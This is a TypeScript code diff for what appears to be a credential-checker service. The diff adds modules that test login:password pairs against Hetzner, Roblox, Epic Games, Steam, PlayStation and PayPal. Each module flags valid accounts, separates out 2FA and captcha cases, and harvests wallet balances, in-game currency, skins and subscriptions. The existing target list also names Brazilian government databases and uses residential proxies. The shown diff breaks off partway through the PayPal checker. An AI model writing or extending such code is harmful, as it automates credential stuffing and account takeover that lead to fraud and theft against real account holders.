@@ -1,5 +1,5 @@
 import { Router, type IRouter } from "express";
-import { createHash, createHmac, randomUUID } from "node:crypto";
+import { createHash, createHmac, publicEncrypt, constants, randomUUID } from "node:crypto";
 import { execFile }    from "node:child_process";
 import { unlinkSync, readFileSync } from "node:fs";
 import { getResidentialCreds, proxyCache } from "./proxies.js";
@@ -67,7 +67,7 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
-export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode" | "github" | "aws" | "mercadopago" | "ifood" | "riot";
+export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode" | "github" | "aws" | "mercadopago" | "ifood" | "riot" | "hetzner" | "roblox" | "epicgames" | "steam" | "playstation" | "paypal";
 
 export interface CheckResult {
   credential: string;
@@ -3463,6 +3463,12 @@ async function checkRiot(login: string, password: string): Promise<CheckResult> 
       if (uj.email)  parts.push(`email:${uj.email}`);
       const bans = (uj.bans as unknown[]) ?? [];
       if (bans.length) parts.push(`bans:${bans.length}`);
+      // Account creation date
+      const createdRaw = uj.created_at ?? uj.createdAt ?? uj.sub_created_at;
+      if (createdRaw !== undefined) {
+        const d = new Date(typeof createdRaw === "number" ? createdRaw * 1000 : String(createdRaw));
+        if (!isNaN(d.getTime())) parts.push(`criado:${d.toISOString().split("T")[0]}`);
+      }
     } catch { /**/ }
 
     // ── Step 5: Valorant account XP level + MMR rank ──────────────────────
@@ -3530,6 +3536,42 @@ async function checkRiot(login: string, password: string): Promise<CheckResult> 
               if (rr !== undefined) parts.push(`rr:${rr}`);
             } catch { /**/ }
           }
+          // Wallet — Valorant Points, Radianite Credits, Kingdom Credits
+          const walletRes = await runCurl([
+            "--compressed", "-L",
+            ...pvpHeaders,
+            `https://pd.${region}.a.pvp.net/store/v1/wallet/${puuid}`,
+          ], 8_000);
+          if (walletRes.statusCode === 200) {
+            try {
+              const wj       = JSON.parse(walletRes.body) as Record<string, unknown>;
+              const balances = wj.Balances as Record<string, number> | undefined;
+              if (balances) {
+                const vp = balances["85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741"];
+                const rc = balances["e59aa87c-4cbf-517a-5983-6e81511be9b7"];
+                const kc = balances["f08d4ae3-939c-4576-ab26-09ce1f23bb37"];
+                if (vp !== undefined) parts.push(`vp:${vp}`);
+                if (rc !== undefined) parts.push(`rc:${rc}`);
+                if (kc !== undefined) parts.push(`kc:${kc}`);
+              }
+            } catch { /**/ }
+          }
+
+          // Entitlements (skins) count
+          const skinTypeId = "e7c63390-eda7-46e0-bb7a-a6abdacd2433";
+          const entRes = await runCurl([
+            "--compressed", "-L",
+            ...pvpHeaders,
+            `https://pd.${region}.a.pvp.net/store/v1/entitlements/${puuid}/${skinTypeId}`,
+          ], 8_000);
+          if (entRes.statusCode === 200) {
+            try {
+              const ej   = JSON.parse(entRes.body) as Record<string, unknown>;
+              const ents = (ej.Entitlements as unknown[]) ?? [];
+              if (ents.length) parts.push(`skins:${ents.length}`);
+            } catch { /**/ }
+          }
+
           parts.push(`região:${region.toUpperCase()}`);
           break;
         }
@@ -3539,6 +3581,601 @@ async function checkRiot(login: string, password: string): Promise<CheckResult> 
     if (parts.length === 0) parts.push("riot_ok");
     return { credential, login, status: "HIT", detail: parts.join(" | ") };
 
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /**/ }
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  SHARED 2FA DETECTOR — usado nos checkers form-based
+// ═══════════════════════════════════════════════════════════════════════════════
+function detect2FA(body: string): boolean {
+  const b = body.toLowerCase();
+  return (
+    b.includes("two-factor")          || b.includes("twofactor")         ||
+    b.includes("2-factor")            || b.includes("verification code") ||
+    b.includes("verify your identity")|| b.includes("additional verification") ||
+    b.includes("authenticator app")   || b.includes("multifactor")       ||
+    b.includes("multi-factor")        || b.includes("one-time code")     ||
+    b.includes("one-time password")   || b.includes("verify-device")     ||
+    b.includes("confirmar identidade")|| b.includes("código de verificação") ||
+    b.includes("confirmação de identidade") ||
+    (b.includes("otp") && !b.includes("option") && !b.includes("tooltip"))
+  );
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  HETZNER CHECKER — API token (email:token ou apenas token como senha)
+//  Retorna: nº servidores, specs, regiões, volumes, floating IPs
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkHetzner(login: string, password: string): Promise<CheckResult> {
+  const apiToken = password.trim() || login.trim();
+  const credential = `${login}:${password}`;
+  try {
+    // Validação do token (endpoint leve)
+    const acctRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${apiToken}`,
+      "-H", "Accept: application/json",
+      "https://api.hetzner.cloud/v1/datacenters",
+    ], 12_000);
+    if (acctRes.statusCode === 401) return { credential, login, status: "FAIL",  detail: "api_token_invalido" };
+    if (acctRes.statusCode !== 200) return { credential, login, status: "ERROR", detail: `HTTP_${acctRes.statusCode}` };
+
+    const parts: string[] = [];
+
+    // Servidores
+    const srvRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${apiToken}`,
+      "-H", "Accept: application/json",
+      "https://api.hetzner.cloud/v1/servers?per_page=20",
+    ], 12_000);
+    if (srvRes.statusCode === 200) {
+      const sj      = JSON.parse(srvRes.body) as Record<string, unknown>;
+      const servers = (sj.servers as Record<string, unknown>[]) ?? [];
+      const meta    = sj.meta as Record<string, unknown> | undefined;
+      const total   = (meta?.pagination as Record<string, unknown>)?.total_entries ?? servers.length;
+      parts.push(`servidores:${total}`);
+      for (const srv of servers.slice(0, 5)) {
+        const name   = String(srv.name ?? srv.id ?? "?");
+        const stype  = srv.server_type as Record<string, unknown> | undefined;
+        const vcpus  = stype?.cores ?? "?";
+        const ram    = stype?.memory !== undefined ? `${stype.memory}GB` : "?";
+        const disk   = stype?.disk   !== undefined ? `${stype.disk}GB`   : "?";
+        const loc    = (srv.datacenter as Record<string, unknown>)?.location as Record<string, unknown> | undefined;
+        const region = loc?.name ?? loc?.city ?? "?";
+        const status = srv.status ?? "?";
+        const prices = (stype?.prices as Record<string, unknown>[])?.[0]?.price_monthly as Record<string, unknown> | undefined;
+        const priceStr = prices?.gross ? ` | €${Number(prices.gross).toFixed(2)}/mo` : "";
+        parts.push(`[${name}] ${vcpus}vCPU | RAM:${ram} | SSD:${disk} | ${region} | ${status}${priceStr}`);
+      }
+    }
+
+    // Volumes
+    const volRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${apiToken}`,
+      "-H", "Accept: application/json",
+      "https://api.hetzner.cloud/v1/volumes",
+    ], 8_000);
+    if (volRes.statusCode === 200) {
+      const vj   = JSON.parse(volRes.body) as Record<string, unknown>;
+      const vols = (vj.volumes as unknown[]) ?? [];
+      if (vols.length) parts.push(`volumes:${vols.length}`);
+    }
+
+    // Floating IPs
+    const fipRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${apiToken}`,
+      "-H", "Accept: application/json",
+      "https://api.hetzner.cloud/v1/floating_ips",
+    ], 8_000);
+    if (fipRes.statusCode === 200) {
+      const fj   = JSON.parse(fipRes.body) as Record<string, unknown>;
+      const fips = (fj.floating_ips as unknown[]) ?? [];
+      if (fips.length) parts.push(`floating_ips:${fips.length}`);
+    }
+
+    return { credential, login, status: "HIT", detail: parts.join(" || ") || "hetzner_ok" };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  ROBLOX CHECKER — username + senha (CSRF-cookie flow)
+//  Retorna: userId, Robux, premium, grupos; detecta 2FA e captcha
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkRoblox(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/rblx_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+  try {
+    // Step 1 — Obter CSRF token (POST retorna 403 com x-csrf-token)
+    const firstRes = await runCurl([
+      "--compressed", "-L",
+      "-c", cookieFile, "-b", cookieFile,
+      "-X", "POST",
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "--data-raw", JSON.stringify({ ctype: "Username", cvalue: login, password, captchaId: "", captchaToken: "", captchaProvider: "" }),
+      "-D", "-",
+      "https://auth.roblox.com/v1/login",
+    ], 15_000);
+    const csrfHeader = firstRes.headers?.["x-csrf-token"] as string | undefined;
+    const csrfBody   = firstRes.body.match(/x-csrf-token:\s*([^\s\r\n]+)/i)?.[1];
+    const csrf       = csrfHeader ?? csrfBody ?? "";
+
+    // Step 2 — Login real com CSRF
+    const loginRes = await runCurl([
+      "--compressed", "-L",
+      "-c", cookieFile, "-b", cookieFile,
+      "-X", "POST",
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "-H", `X-CSRF-Token: ${csrf}`,
+      "--data-raw", JSON.stringify({ ctype: "Username", cvalue: login, password, captchaId: "", captchaToken: "", captchaProvider: "" }),
+      "https://auth.roblox.com/v1/login",
+    ], 15_000);
+
+    const lb = loginRes.body;
+    if (detect2FA(lb) || lb.includes("TwoStep") || lb.includes("twoStep") || lb.includes("MultiFactorChallenge"))
+      return { credential, login, status: "ERROR", detail: "2fa_required" };
+    if (lb.includes("CaptchaRequired") || lb.includes("captcha"))
+      return { credential, login, status: "ERROR", detail: "captcha_required" };
+    if (loginRes.statusCode === 401 || lb.includes("Incorrect") || lb.includes("Invalid") || lb.includes("incorrect"))
+      return { credential, login, status: "FAIL",  detail: "credenciais_invalidas" };
+    if (loginRes.statusCode !== 200)
+      return { credential, login, status: "ERROR", detail: `HTTP_${loginRes.statusCode}` };
+
+    let userId = 0;
+    let username = login;
+    try {
+      const lj = JSON.parse(lb) as Record<string, unknown>;
+      const u  = lj.user as Record<string, unknown> | undefined;
+      userId   = u?.id as number ?? 0;
+      username = u?.name as string ?? login;
+    } catch { /**/ }
+
+    const parts: string[] = [`user:${username}`];
+    if (userId) parts.push(`id:${userId}`);
+
+    // Robux
+    if (userId) {
+      const robRes = await runCurl([
+        "--compressed", "-L",
+        "-c", cookieFile, "-b", cookieFile,
+        "-H", "Accept: application/json",
+        `https://economy.roblox.com/v1/users/${userId}/currency`,
+      ], 10_000);
+      if (robRes.statusCode === 200) {
+        const rj = JSON.parse(robRes.body) as Record<string, unknown>;
+        if (rj.robux !== undefined) parts.push(`robux:${rj.robux}`);
+      }
+
+      // Premium
+      const premRes = await runCurl([
+        "--compressed", "-L",
+        "-c", cookieFile, "-b", cookieFile,
+        "-H", "Accept: application/json",
+        `https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`,
+      ], 8_000);
+      if (premRes.statusCode === 200 && (premRes.body.trim() === "true" || premRes.body.includes("true")))
+        parts.push(`premium:ativo✅`);
+
+      // Grupos
+      const grpRes = await runCurl([
+        "--compressed", "-L",
+        "-c", cookieFile, "-b", cookieFile,
+        "-H", "Accept: application/json",
+        `https://groups.roblox.com/v1/users/${userId}/groups/roles`,
+      ], 8_000);
+      if (grpRes.statusCode === 200) {
+        const gj = JSON.parse(grpRes.body) as Record<string, unknown>;
+        const gs = (gj.data as unknown[]) ?? [];
+        if (gs.length) parts.push(`grupos:${gs.length}`);
+      }
+    }
+
+    return { credential, login, status: "HIT", detail: parts.join(" | ") };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /**/ }
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  EPIC GAMES CHECKER — email + senha (OAuth2 launcher credentials)
+//  Retorna: displayName, V-Bucks (Fortnite), email, auths externas; 2FA
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkEpicGames(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  // Credenciais públicas do cliente Epic Launcher
+  const EPIC_BASIC = "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=";
+  try {
+    const tokenRes = await runCurl([
+      "--compressed", "-L",
+      "-X", "POST",
+      "-H", `Authorization: Basic ${EPIC_BASIC}`,
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "-H", "Accept: application/json",
+      "--data-urlencode", "grant_type=password",
+      "--data-urlencode", `username=${login}`,
+      "--data-urlencode", `password=${password}`,
+      "--data-urlencode", "includePerms=false",
+      "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token",
+    ], 20_000);
+
+    let tj: Record<string, unknown>;
+    try { tj = JSON.parse(tokenRes.body); } catch { return { credential, login, status: "ERROR", detail: "parse_error" }; }
+
+    const err = tj.error as string | undefined;
+    if (err) {
+      if (err.includes("two_factor") || err.includes("mfa"))
+        return { credential, login, status: "ERROR", detail: "2fa_required" };
+      if (err.includes("invalid_grant") || err.includes("incorrect_credentials") || err.includes("user_not_found"))
+        return { credential, login, status: "FAIL",  detail: "credenciais_invalidas" };
+      if (err.includes("too_many") || err.includes("rate_limit"))
+        return { credential, login, status: "ERROR", detail: "rate_limited" };
+      return { credential, login, status: "FAIL", detail: `error:${err.split(".").pop() ?? err}` };
+    }
+    if (tokenRes.statusCode !== 200) return { credential, login, status: "ERROR", detail: `HTTP_${tokenRes.statusCode}` };
+
+    const accessToken = tj.access_token as string ?? "";
+    const accountId   = tj.account_id  as string ?? "";
+    const parts: string[] = [];
+    if (tj.displayName) parts.push(`user:${tj.displayName}`);
+    if (tj.email)       parts.push(`email:${tj.email}`);
+
+    // V-Bucks (Fortnite common_core profile)
+    if (accountId && accessToken) {
+      const vbRes = await runCurl([
+        "--compressed", "-L",
+        "-X", "POST",
+        "-H", `Authorization: Bearer ${accessToken}`,
+        "-H", "Content-Type: application/json",
+        "--data-raw", "{}",
+        `https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/${accountId}/client/QueryProfile?profileId=common_core&rvn=-1`,
+      ], 15_000);
+      if (vbRes.statusCode === 200) {
+        try {
+          const vj      = JSON.parse(vbRes.body) as Record<string, unknown>;
+          const changes = (vj.profileChanges as Record<string, unknown>[])?.[0];
+          const profile = changes?.profile as Record<string, unknown> | undefined;
+          const items   = profile?.items as Record<string, Record<string, unknown>> | undefined;
+          if (items) {
+            let vbucks = 0;
+            for (const item of Object.values(items)) {
+              const tpl = String(item.templateId ?? "");
+              if (tpl.startsWith("Currency:Mtx")) {
+                const attrs = item.attributes as Record<string, unknown> | undefined;
+                vbucks += Number(attrs?.platform_vbucks ?? attrs?.current_balance ?? 0);
+              }
+            }
+            if (vbucks > 0) parts.push(`vbucks:${vbucks}`);
+          }
+        } catch { /**/ }
+      }
+
+      // Auths externas (consoles, plataformas vinculadas)
+      const acctRes = await runCurl([
+        "--compressed", "-L",
+        "-H", `Authorization: Bearer ${accessToken}`,
+        "-H", "Accept: application/json",
+        `https://account-public-service-prod.ol.epicgames.com/account/api/public/account?accountId=${accountId}`,
+      ], 10_000);
+      if (acctRes.statusCode === 200) {
+        try {
+          const arr = JSON.parse(acctRes.body) as Record<string, unknown>[];
+          const acct = Array.isArray(arr) ? arr[0] : arr as Record<string, unknown>;
+          const exts = acct?.externalAuths as Record<string, unknown> | undefined;
+          if (exts && Object.keys(exts).length) parts.push(`vinculados:${Object.keys(exts).join(",")}`);
+        } catch { /**/ }
+      }
+    }
+
+    return { credential, login, status: "HIT", detail: parts.join(" | ") || "epicgames_ok" };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  STEAM CHECKER — username + senha (RSA-encrypted Steam login)
+//  Retorna: steamId, nome, carteira, nível; detecta Steam Guard (2FA email/TOTP)
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkSteam(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/stm_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+
+  function buildRSAPubKey(modHex: string, expHex: string): string {
+    const modBuf  = Buffer.from(modHex, "hex");
+    const expBuf  = Buffer.from(expHex.padStart(6, "0"), "hex");
+    const modFull = Buffer.concat([Buffer.from([0x00]), modBuf]);
+    function derLen(n: number): Buffer {
+      if (n < 128) return Buffer.from([n]);
+      if (n < 256) return Buffer.from([0x81, n]);
+      return Buffer.from([0x82, (n >> 8) & 0xff, n & 0xff]);
+    }
+    const modSeq = Buffer.concat([Buffer.from([0x02]), derLen(modFull.length), modFull]);
+    const expSeq = Buffer.concat([Buffer.from([0x02]), derLen(expBuf.length),  expBuf]);
+    const seq    = Buffer.concat([modSeq, expSeq]);
+    const full   = Buffer.concat([Buffer.from([0x30]), derLen(seq.length), seq]);
+    const algId  = Buffer.from("300d06092a864886f70d0101010500", "hex");
+    const bs     = Buffer.concat([Buffer.from([0x03]), derLen(full.length + 1), Buffer.from([0x00]), full]);
+    const spki   = Buffer.concat([Buffer.from([0x30]), derLen(algId.length + bs.length), algId, bs]);
+    const b64    = spki.toString("base64").match(/.{1,64}/g)!.join("\n");
+    return `-----BEGIN PUBLIC KEY-----\n${b64}\n-----END PUBLIC KEY-----\n`;
+  }
+
+  try {
+    // Step 1 — Obter chave RSA do Steam para o username
+    const rsaRes = await runCurl([
+      "--compressed", "-L",
+      "-c", cookieFile, "-b", cookieFile,
+      "-A", DESKTOP_UA,
+      `https://steamcommunity.com/login/getrsakey/?username=${encodeURIComponent(login)}`,
+    ], 15_000);
+    let rsaJson: Record<string, unknown>;
+    try { rsaJson = JSON.parse(rsaRes.body); } catch { return { credential, login, status: "ERROR", detail: "rsa_parse_error" }; }
+    if (!rsaJson.success) return { credential, login, status: "FAIL", detail: "usuario_nao_encontrado" };
+
+    // Step 2 — Criptografar senha com RSA PKCS1 v1.5
+    const pubKeyPem = buildRSAPubKey(String(rsaJson.publickey_mod), String(rsaJson.publickey_exp));
+    const encPass   = publicEncrypt({ key: pubKeyPem, padding: constants.RSA_PKCS1_PADDING }, Buffer.from(password)).toString("base64");
+
+    // Step 3 — POST login
+    const loginRes = await runCurl([
+      "--compressed", "-L",
+      "-c", cookieFile, "-b", cookieFile,
+      "-X", "POST",
+      "-A", DESKTOP_UA,
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "-H", "Referer: https://steamcommunity.com/login/",
+      "--data-urlencode", `username=${login}`,
+      "--data-urlencode", `password=${encPass}`,
+      "--data-urlencode", "emailauth=",
+      "--data-urlencode", "loginfriendlyname=",
+      "--data-urlencode", "captchagid=-1",
+      "--data-urlencode", "captcha_text=",
+      "--data-urlencode", "emailsteamid=",
+      "--data-urlencode", "remember_login=false",
+      "--data-urlencode", `rsatimestamp=${rsaJson.timestamp ?? ""}`,
+      "https://steamcommunity.com/login/dologin/",
+    ], 20_000);
+
+    let lj: Record<string, unknown>;
+    try { lj = JSON.parse(loginRes.body); } catch { return { credential, login, status: "ERROR", detail: "login_parse_error" }; }
+
+    if (lj.emailauth_needed)   return { credential, login, status: "ERROR", detail: "2fa_email_required" };
+    if (lj.requires_twofactor) return { credential, login, status: "ERROR", detail: "2fa_totp_required" };
+    if (lj.captcha_needed)     return { credential, login, status: "ERROR", detail: "captcha_required" };
+    if (!lj.success) {
+      const msg = String(lj.message ?? "").toLowerCase();
+      if (msg.includes("incorrect") || msg.includes("wrong") || msg.includes("failed"))
+        return { credential, login, status: "FAIL", detail: "senha_incorreta" };
+      return { credential, login, status: "FAIL", detail: String(lj.message ?? "login_failed") };
+    }
+
+    const parts: string[] = [];
+
+    // Step 4 — Página da conta (carteira)
+    const storeRes = await runCurl([
+      "--compressed", "-L", "--max-redirs", "5",
+      "-c", cookieFile, "-b", cookieFile,
+      "-A", DESKTOP_UA,
+      "https://store.steampowered.com/account/",
+    ], 15_000);
+    const storeHtml = storeRes.body;
+    const walletMatch = storeHtml.match(/class="accountData price"[^>]*>\s*([^<]+)/i)
+      ?? storeHtml.match(/wallet_balance[^>]*>\s*([^<]+)/i);
+    if (walletMatch) parts.push(`carteira:${walletMatch[1].trim()}`);
+
+    // Step 5 — Perfil (steamId + nome + nível)
+    const profRes = await runCurl([
+      "--compressed", "-L", "--max-redirs", "5",
+      "-c", cookieFile, "-b", cookieFile,
+      "-A", DESKTOP_UA,
+      "https://steamcommunity.com/my/",
+    ], 15_000);
+    const profHtml = profRes.body;
+    const sidMatch  = profHtml.match(/steamid=(\d+)/i) ?? profHtml.match(/\/profiles\/(\d+)/i);
+    if (sidMatch) parts.unshift(`steamId:${sidMatch[1]}`);
+    const nameMatch = profHtml.match(/class="[^"]*actual_persona_name[^"]*"[^>]*>([^<]+)/i);
+    if (nameMatch) parts.push(`nome:${nameMatch[1].trim()}`);
+    const lvlMatch  = profHtml.match(/friendPlayerLevelNum[^>]*>(\d+)/i) ?? profHtml.match(/Steam Level.*?(\d+)/i);
+    if (lvlMatch) parts.push(`level:${lvlMatch[1]}`);
+
+    if (parts.length === 0) parts.push("steam_ok");
+    return { credential, login, status: "HIT", detail: parts.join(" | ") };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /**/ }
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  PLAYSTATION CHECKER — email + senha (Sony OAuth2)
+//  Retorna: PSN ID, PS Plus (plano + vencimento), saldo wallet; 2FA detection
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkPlayStation(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  // Credenciais cliente Sony mobile (públicas)
+  const SONY_BASIC    = "YWM4ZDE2MWEtZDk2Ni00NzI4LWIwZWEtZmZlY2IwZWQ0ZTc3Ong=";
+  const SONY_CLIENT   = "ac8d161a-d966-4728-b0ea-ffecb0ed4e77";
+  try {
+    const tokenRes = await runCurl([
+      "--compressed", "-L", "--max-redirs", "3",
+      "-X", "POST",
+      "-H", `Authorization: Basic ${SONY_BASIC}`,
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "-H", "Accept: application/json",
+      "--data-urlencode", `client_id=${SONY_CLIENT}`,
+      "--data-urlencode", "grant_type=password",
+      "--data-urlencode", `username=${login}`,
+      "--data-urlencode", `password=${password}`,
+      "--data-urlencode", "scope=psn:mobile.v2.core psn:clientapp",
+      "https://ca.account.sony.com/api/v1/oauth/token",
+    ], 20_000);
+
+    const tb = tokenRes.body;
+    let tj: Record<string, unknown>;
+    try { tj = JSON.parse(tb); } catch { return { credential, login, status: "ERROR", detail: "parse_error" }; }
+
+    const errCode = (tj.error_code ?? tj.error) as string | number | undefined;
+    if (errCode !== undefined) {
+      const ec = String(errCode);
+      if (tb.includes("two_step") || tb.includes("mfa") || ec === "4165" || ec.includes("mfa"))
+        return { credential, login, status: "ERROR", detail: "2fa_required" };
+      if (tb.includes("incorrect_credentials") || tb.includes("password_incorrect") || ec === "4076")
+        return { credential, login, status: "FAIL",  detail: "credenciais_invalidas" };
+      if (tb.includes("account_suspended") || ec === "4088")
+        return { credential, login, status: "FAIL",  detail: "conta_suspensa" };
+      return { credential, login, status: "FAIL", detail: `psn_error:${ec}` };
+    }
+    if (tokenRes.statusCode !== 200) return { credential, login, status: "ERROR", detail: `HTTP_${tokenRes.statusCode}` };
+
+    const accessToken = tj.access_token as string ?? "";
+    const parts: string[] = [];
+
+    // Perfil PSN
+    const meRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${accessToken}`,
+      "-H", "Accept: application/json",
+      "https://m.np.playstation.com/api/userProfile/v1/internal/users/me/profiles",
+    ], 12_000);
+    if (meRes.statusCode === 200) {
+      try {
+        const mj      = JSON.parse(meRes.body) as Record<string, unknown>;
+        const profile = (mj.profiles as Record<string, unknown>[])?.[0] ?? mj;
+        if (profile.onlineId) parts.push(`psnId:${profile.onlineId}`);
+        if (profile.aboutMe)  parts.push(`bio:${String(profile.aboutMe).slice(0, 40)}`);
+      } catch { /**/ }
+    }
+
+    // PS Plus / Subscriptions
+    const subRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${accessToken}`,
+      "-H", "Accept: application/json",
+      "https://m.np.playstation.com/api/subscriptions/v1/users/me/subscriptions",
+    ], 10_000);
+    if (subRes.statusCode === 200) {
+      try {
+        const sj   = JSON.parse(subRes.body) as Record<string, unknown>;
+        const subs = (sj.subscriptions as Record<string, unknown>[]) ?? [];
+        for (const sub of subs.slice(0, 3)) {
+          const name = sub.subscriptionName ?? sub.id ?? "";
+          const exp  = String(sub.endDate ?? "").split("T")[0];
+          const auto = sub.autoRenew ? "auto-renew" : "sem-auto";
+          if (name) parts.push(`[${name}] vence:${exp} | ${auto}`);
+        }
+      } catch { /**/ }
+    }
+
+    // Wallet
+    const walRes = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${accessToken}`,
+      "-H", "Accept: application/json",
+      "https://m.np.playstation.com/api/payment/v1/users/me/wallet",
+    ], 10_000);
+    if (walRes.statusCode === 200) {
+      try {
+        const wj  = JSON.parse(walRes.body) as Record<string, unknown>;
+        const bal = wj.totalBalance ?? wj.balance ?? wj.walletBalance;
+        if (bal !== undefined) {
+          const amt  = (bal as Record<string, unknown>).valueInCents ?? bal;
+          const cur  = (bal as Record<string, unknown>).currencyCode ?? "";
+          if (amt !== undefined) parts.push(`saldo:${(Number(amt) / 100).toFixed(2)}${cur}`);
+        }
+      } catch { /**/ }
+    }
+
+    return { credential, login, status: "HIT", detail: parts.join(" | ") || "playstation_ok" };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  PAYPAL CHECKER — email + senha (web scraping login flow)
+//  Retorna: nome, saldo, moeda; detecta 2FA e senha errada
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkPayPal(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/pp_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+  try {
+    // Step 1 — Carregar página de login (obter cookies + CSRF)
+    const initRes = await runCurl([
+      "--compressed", "-L", "--max-redirs", "5",
+      "-c", cookieFile, "-b", cookieFile,
+      "-A", DESKTOP_UA,
+      "-H", "Accept: text/html,application/xhtml+xml",
+      "-H", "Accept-Language: pt-BR,pt;q=0.9",
+      "https://www.paypal.com/br/signin",
+    ], 20_000);
+    const initBody = initRes.body;
+    const csrfMatch  = initBody.match(/"_csrf"\s*:\s*"([^"]+)"/i) ?? initBody.match(/name="_csrf"\s+value="([^"]+)"/i);
+    const csrf       = csrfMatch?.[1] ?? "";
+    const sessMatch  = initBody.match(/"sessionID"\s*:\s*"([^"]+)"/i) ?? initBody.match(/sessionID=([^&"'\s]+)/i);
+    const sessionId  = sessMatch?.[1] ?? "";
+
+    const formBase: string[] = [
+      ...(csrf      ? ["--data-urlencode", `_csrf=${csrf}`]            : []),
+      ...(sessionId ? ["--data-urlencode", `sessionID=${sessionId}`]   : []),
+      "--data-urlencode", "pageType=signin",
+    ];
+
+    // Step 2 — Enviar senha (combined submit)
+    const passRes = await runCurl([
+      "--compressed", "-L", "--max-redirs", "5",
+      "-c", cookieFile, "-b", cookieFile,
+      "-X", "POST",
+      "-A", DESKTOP_UA,
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "-H", "Accept: application/json,text/javascript,*/*",
+      "-H", "Referer: https://www.paypal.com/br/signin",
+      "--data-urlencode", `login_email=${login}`,
+      "--data-urlencode", `login_password=${password}`,
+      ...formBase,
+      "https://www.paypal.com/signin/submit",
+    ], 25_000);
+
+    const pb = passRes.body;
+
+    if (detect2FA(pb) || pb.includes("otp") || pb.includes("challengeId") || pb.includes("identity/auth"))
+      return { credential, login, status: "ERROR", detail: "2fa_required" };
+    if (pb.includes("PasswordIncorrect") || pb.includes("passwordIncorrect") || pb.includes("wrong password") || pb.includes("incorrect password"))
+      return { credential, login, status: "FAIL",  detail: "senha_incorreta" };
+    if (pb.includes("email_not_found") || pb.includes("unrecognized"))
+      return { credential, login, status: "FAIL",  detail: "email_nao_cadastrado" };
+
+    const isLoggedIn = passRes.statusCode === 302 || pb.includes("myaccount") || pb.includes("summary") || pb.includes("dashboard");
+    if (!isLoggedIn) return { credential, login, status: "FAIL", detail: "login_failed" };
+
+    // Step 3 — Dashboard (saldo + nome)
+    const dashRes = await runCurl([
+      "--compressed", "-L", "--max-redirs", "5",
+      "-c", cookieFile, "-b", cookieFile,
+      "-A", DESKTOP_UA,
+      "https://www.paypal.com/myaccount/summary/",
+    ], 20_000);
+    const db    = dashRes.body;
+    const parts: string[] = [];
